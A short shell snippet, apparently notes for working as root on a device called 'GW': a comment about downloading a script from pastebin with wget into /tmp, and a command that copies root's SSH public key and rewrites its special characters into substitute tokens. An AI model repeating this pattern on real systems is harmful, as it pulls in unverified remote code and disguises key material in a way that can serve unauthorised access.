# Use pastebin to wget it to GW. (wget http://pastebin.com/raw/<id> -O /tmp/magic.sh) Note that https is not supported on GW.
cp /home/root/.ssh/id_rsa.public /tmp/key ; sed -i -e 's/\//APA/g' /tmp/key ; sed -i -e 's/\+/HAST/g' /tmp/key ; sed -i -e 's/=/OSNA/g' /tmp/key
